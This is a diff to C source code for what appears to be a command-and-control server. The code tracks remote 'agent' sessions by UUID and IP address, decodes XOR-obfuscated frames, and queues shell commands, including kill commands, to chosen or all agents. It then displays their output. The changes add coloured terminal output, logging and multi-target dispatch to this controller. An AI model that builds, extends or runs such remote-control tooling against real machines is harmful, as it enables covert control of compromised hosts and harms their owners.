@@ -2,6 +2,14 @@
 #include "../include/Cipher.h"
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h>
+
+#define ColReset "\033[0m"
+#define ColWhite "\033[1;37m"
+#define ColGray  "\033[0;90m"
+#define ColGreen "\033[0;32m"
+#define ColCyan  "\033[0;36m"
+#define ColRed   "\033[1;31m"
 
 static void ReprintPrompt(SessionPool *P)
 {
@@ -15,23 +23,15 @@ static void ReprintPrompt(SessionPool *P)
     fflush(stdout);
 }
 
-/*
- * Parse wire frame: "<36-char UUID>|<XOR-payload>"
- * UUID portion is plaintext, payload is XOR-decrypted in place.
- * Returns 1 on success, 0 if frame is malformed.
- */
 int FrameParse(const char *Raw, int RawLen,
                char *UuidOut, char *PayloadOut, int *PayloadLen)
 {
     if (RawLen < 38) return 0;
     if (Raw[36] != '|') return 0;
-
     memcpy(UuidOut, Raw, 36);
     UuidOut[36] = '\0';
-
     int PLen = RawLen - 37;
     if (PLen <= 0 || PLen >= BufSize) return 0;
-
     memcpy(PayloadOut, Raw + 37, (size_t)PLen);
     PayloadOut[PLen] = '\0';
     ApplyXor(PayloadOut, (size_t)PLen);
@@ -39,12 +39,13 @@ int FrameParse(const char *Raw, int RawLen,
     return 1;
 }
 
-void PoolInit(SessionPool *P)
+void PoolInit(SessionPool *P, LogStore *L)
 {
     memset(P, 0, sizeof(*P));
     P->NextId      = 1;
     P->Interactive = 0;
     P->ActiveId    = 0;
+    P->Log         = L;
 }
 
 AgentSession *PoolRegister(SessionPool *P, const char *Uuid, const char *Ip)
@@ -56,9 +57,7 @@ AgentSession *PoolRegister(SessionPool *P, const char *Uuid, const char *Ip)
             return S;
         }
     }
-
     if (P->Count >= MaxSessions) return NULL;
-
     AgentSession *S = &P->Slots[P->Count];
     memset(S, 0, sizeof(*S));
     S->Id        = P->NextId++;
@@ -89,43 +88,54 @@ void PoolList(SessionPool *P)
 {
     int Found = 0;
     printf("\n");
-    printf("  %-4s  %-18s  %-38s  %-10s  %s\n",
-           "ID", "Address", "UUID", "State", "Last Seen");
-    printf("  %-4s  %-18s  %-38s  %-10s  %s\n",
+    printf("  %s%-4s  %-18s  %-38s  %-10s  %s%s\n",
+           ColWhite, "ID", "Address", "UUID", "State", "Last Seen", ColReset);
+    printf("  %s%-4s  %-18s  %-38s  %-10s  %s%s\n",
+           ColGray,
            "----", "------------------", "--------------------------------------",
-           "----------", "---------");
+           "----------", "---------", ColReset);
     for (int I = 0; I < P->Count; I++) {
         AgentSession *S = &P->Slots[I];
         if (S->State != StateActive) continue;
         char Ts[32];
         struct tm *Tm = localtime(&S->LastSeen);
         strftime(Ts, sizeof(Ts), "%H:%M:%S", Tm);
-        printf("  %-4d  %-18s  %-38s  %-10s  %s\n",
-               S->Id, S->Address, S->Uuid, "active", Ts);
+        printf("  %s%-4d%s  %s%-18s%s  %s%-38s%s  %s%-10s%s  %s\n",
+               ColCyan,  S->Id,        ColReset,
+               ColWhite, S->Address,   ColReset,
+               ColGray,  S->Uuid,      ColReset,
+               ColGreen, "active",     ColReset,
+               Ts);
         Found = 1;
     }
-    if (!Found) printf("  No active sessions.\n");
+    if (!Found) printf("  %sNo active sessions.%s\n", ColGray, ColReset);
     printf("\n");
 }
 
 void PoolKill(SessionPool *P, int Id)
 {
     AgentSession *S = PoolById(P, Id);
-    if (!S) { printf("[!] Session %d not found.\n", Id); ReprintPrompt(P); return; }
+    if (!S) {
+        Msg(P->Log, LogError, "Session %d not found", Id);
+        ReprintPrompt(P); return;
+    }
     PoolQueueCommand(S, "kill");
     S->State = StateDead;
     if (P->ActiveId == Id) { P->Interactive = 0; P->ActiveId = 0; }
-    printf("[*] Kill queued for session-%d (%s)\n", Id, S->Address);
+    Msg(P->Log, LogWarn, "Kill queued for session-%d (%s)", Id, S->Address);
     ReprintPrompt(P);
 }
 
 void PoolEnter(SessionPool *P, int Id)
 {
     AgentSession *S = PoolById(P, Id);
-    if (!S) { printf("[!] Session %d not found.\n", Id); ReprintPrompt(P); return; }
+    if (!S) {
+        Msg(P->Log, LogError, "Session %d not found", Id);
+        ReprintPrompt(P); return;
+    }
     P->Interactive = 1;
     P->ActiveId    = Id;
-    printf("[*] session-%d (%s) — type 'back' to return.\n", Id, S->Address);
+    Msg(P->Log, LogInfo, "Entering session-%d (%s)", Id, S->Address);
     printf("session-%d ~$ ", Id);
     fflush(stdout);
 }
@@ -148,36 +158,82 @@ void PoolQueueCommand(AgentSession *S, const char *Cmd)
 void PoolExec(SessionPool *P, int Id, const char *Cmd)
 {
     AgentSession *S = PoolById(P, Id);
-    if (!S) { printf("[!] Session %d not found.\n", Id); ReprintPrompt(P); return; }
+    if (!S) {
+        Msg(P->Log, LogError, "Session %d not found", Id);
+        ReprintPrompt(P); return;
+    }
     PoolQueueCommand(S, Cmd);
-    printf("[*] Queued for session-%d (%s): %s\n", Id, S->Address, Cmd);
+    char LogBuf[LogMsgLen];
+    snprintf(LogBuf, sizeof(LogBuf), "[session-%d] %s", Id, Cmd);
+    LogAdd(P->Log, LogCmd, Id, LogBuf);
+    Msg(P->Log, LogInfo, "Queued for session-%d (%s): %s", Id, S->Address, Cmd);
     ReprintPrompt(P);
 }
 
-void PoolExecAll(SessionPool *P, const char *Cmd)
+/*
+ * Targets format: "all" | "1" | "1,2,3"
+ */
+void PoolExecAll(SessionPool *P, const char *Targets, const char *Cmd)
 {
     int Queued = 0;
+    int All    = !strcmp(Targets, "all");
+
     for (int I = 0; I < P->Count; I++) {
         AgentSession *S = &P->Slots[I];
         if (S->State != StateActive) continue;
+
+        int Match = All;
+        if (!Match) {
+            char Buf[256];
+            strncpy(Buf, Targets, sizeof(Buf) - 1);
+            char *Token = strtok(Buf, ",");
+            while (Token) {
+                while (*Token == ' ') Token++;
+                if (atoi(Token) == S->Id) { Match = 1; break; }
+                Token = strtok(NULL, ",");
+            }
+        }
+        if (!Match) continue;
+
         PoolQueueCommand(S, Cmd);
-        printf("[*] Queued for session-%d (%s)\n", S->Id, S->Address);
+        char LogBuf[LogMsgLen];
+        snprintf(LogBuf, sizeof(LogBuf), "[session-%d] %s", S->Id, Cmd);
+        LogAdd(P->Log, LogCmd, S->Id, LogBuf);
+        Msg(P->Log, LogInfo, "Queued for session-%d (%s)", S->Id, S->Address);
         Queued++;
     }
-    if (!Queued) printf("[!] No active sessions.\n");
-    else         printf("[*] Command queued for %d agent(s): %s\n", Queued, Cmd);
+
+    if (!Queued)
+        Msg(P->Log, LogWarn, "No matching sessions for targets: %s", Targets);
+    else
+        Msg(P->Log, LogInfo, "Command dispatched to %d agent(s): %s", Queued, Cmd);
+
     ReprintPrompt(P);
 }
 
 void PoolNotifyConnect(SessionPool *P, AgentSession *S)
 {
-    printf("\r\033[K[+] session-%d connected: %s (%s)\n",
-           S->Id, S->Address, S->Uuid);
+    char LogBuf[LogMsgLen];
+    snprintf(LogBuf, sizeof(LogBuf), "session-%d connected: %s (%s)",
+             S->Id, S->Address, S->Uuid);
+    LogAdd(P->Log, LogInfo, S->Id, LogBuf);
+
+    printf("\r\033[K%s[%sinfo%s]%s session-%d connected: %s%s\n",
+           ColWhite, "\033[1;34m", ColWhite, ColReset,
+           S->Id, S->Address, ColReset);
     ReprintPrompt(P);
 }
 
 void PoolNotifyOutput(SessionPool *P, AgentSession *S)
 {
-    printf("\r\033[K[session-%d | %s]\n%s\n", S->Id, S->Address, S->LastOutput);
+    char LogBuf[LogMsgLen];
+    char OutSnip[900];
+    strncpy(OutSnip, S->LastOutput, sizeof(OutSnip) - 1);
+    OutSnip[sizeof(OutSnip) - 1] = '\0';
+    snprintf(LogBuf, sizeof(LogBuf), "[session-%d output] %s", S->Id, OutSnip);
+    LogAdd(P->Log, LogOutput, S->Id, LogBuf);
+
+    printf("\r\033[K%s[session-%d | %s]%s\n%s\n",
+           ColCyan, S->Id, S->Address, ColReset, S->LastOutput);
     ReprintPrompt(P);
 }
